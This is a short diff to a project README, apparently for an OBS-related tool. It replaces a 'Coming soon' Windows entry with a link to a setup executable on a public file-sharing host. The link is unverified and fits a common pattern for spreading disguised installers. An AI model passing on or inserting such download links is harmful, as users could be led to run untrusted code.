@@ -67,7 +67,7 @@ Timestamps are saved as `.json` files and can be browsed directly inside the app
   <tr>
     <td> Windows</td>
     <td>2.0</td>
-    <td><em>Coming soon</em></td>
+    <td><a href="https://www.mediafire.com/file/z3aczsyjdl3f00u/OBS_Sessions_Setup.exe/file">Download</a></td>
   </tr>
   <tr>
     <td> Windows</td>
